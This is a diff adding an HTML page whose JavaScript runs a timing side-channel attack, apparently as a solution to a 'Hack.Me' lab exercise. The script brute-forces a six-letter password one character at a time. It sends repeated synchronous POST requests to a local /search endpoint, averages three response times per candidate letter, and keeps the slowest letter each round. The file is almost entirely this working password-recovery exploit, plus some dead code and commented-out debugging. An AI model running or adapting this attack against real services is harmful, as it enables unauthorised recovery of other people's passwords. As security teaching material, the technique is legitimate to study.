@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<script type="text/javascript" src="http://code.jquery.com/jquery-1.7.1.min.js"></script>
+
+<html>
+
+<head>
+
+<link rel="stylesheet" href="C:\Users\Yuval\Desktop\Hack.Me\styles\timing.css">
+
+</head>
+
+<body >
+
+<div class="bg">
+		<button class="search-button" type="button"onclick="myAnswer()">search</button><br>
+
+</div>
+</body>
+
+
+
+<script>
+function sleep(delay){
+var start = new Date().getTime();
+    while (new Date().getTime() < start + delay);
+}
+function makeIterator(array) {
+  let nextIndex = 0
+  return {
+    next: function() {
+      return nextIndex < array.length ? {
+        value: array[nextIndex++],
+        done: false
+      } : {
+        done: true
+      };
+    }
+  };
+}
+function myAnswer(){
+let hashmap = new Map()
+var pass="";
+var sum=0;
+var avg=0.0;
+var count=0;
+var max_avg=0.0;
+
+for(var k=0;k<6;k++){
+	for(var i=0;i<3;i++){
+		for(var j=97;j<123;j++){
+			var ch=String.fromCharCode(j);
+			if(ch=='(' || ch==')' || ch=='[' || ch==']')
+				break;
+			var what_to_send="The password is"+" "+pass+ch;
+			var start_time=new Date().getTime();
+			
+			$(document).ready(function() {
+	$.ajax({
+		url: 'http://127.0.0.1:3000/search',
+		data:   what_to_send,
+		type: 'POST',
+		jsonpCallback: 'callback', // this is not relevant to the POST   anymore
+		 timeout: 5000,
+		 async:false,
+		success: function (data) {
+			var ret = jQuery.parseJSON(data);
+			$('#lblResponse').html(ret.msg);
+			
+			console.log('Success: ')
+		},
+		error: function (xhr, status, error) {
+			console.log('Error: ' + error.message);
+			$('#lblResponse').html('Error connecting to the server.');
+
+		},
+	});
+	
+	 });
+	
+	 
+	 var end=new Date().getTime();
+	 var exectime=end-start_time;
+	 
+	 if(!(hashmap.has(ch))){
+		 hashmap.set(ch,new Array());
+	 }
+	 hashmap.get(ch).push(exectime);
+	 
+	 
+	 
+	 }
+	 }
+	
+	var value;
+	max_avg=0;
+	for(var key=97;key<123;key++){
+		var ch2=String.fromCharCode(key);
+		value=hashmap.get(ch2);
+		sum=0;
+		for(var v=0;v<3;v++){
+			sum+=value[v];
+		}
+		avg=sum/3;
+		hashmap.set(ch2,avg);
+		if(avg>max_avg)
+			max_avg=avg;
+	}
+	for(var key2=97;key2<123;key2++){
+		var ch3=String.fromCharCode(key2);
+		if(hashmap.get(ch3)==max_avg){
+			pass+=ch3;
+			break;
+			}
+	}
+	for(var key3=97;key3<123;key3++){
+		var ch4=String.fromCharCode(key3);
+		hashmap.set(ch4,new Array());
+	}
+	
+	}
+	console.log("The password is : " +pass);
+	 <!-- for (let [k, v] of hashmap) { -->
+	<!-- console.log(k, v); -->
+<!-- } -->
+	<!-- for (var key in hashmap) { -->
+    <!-- // check if the property/key is defined in the object itself, not in parent -->
+	<!-- sum=0; -->
+    <!-- if (hashmap.hasOwnProperty(key)) {            -->
+        <!-- var arr=hashmap.get(key); -->
+		<!-- for (x in arr) { -->
+		<!-- console.log(arr); -->
+		<!-- console.log(x); -->
+		<!-- } -->
+<!-- } -->
+  
+		
+	
+	
+
+
+<!-- } -->
+}
+
+</script> 
+
+
+
+</html>
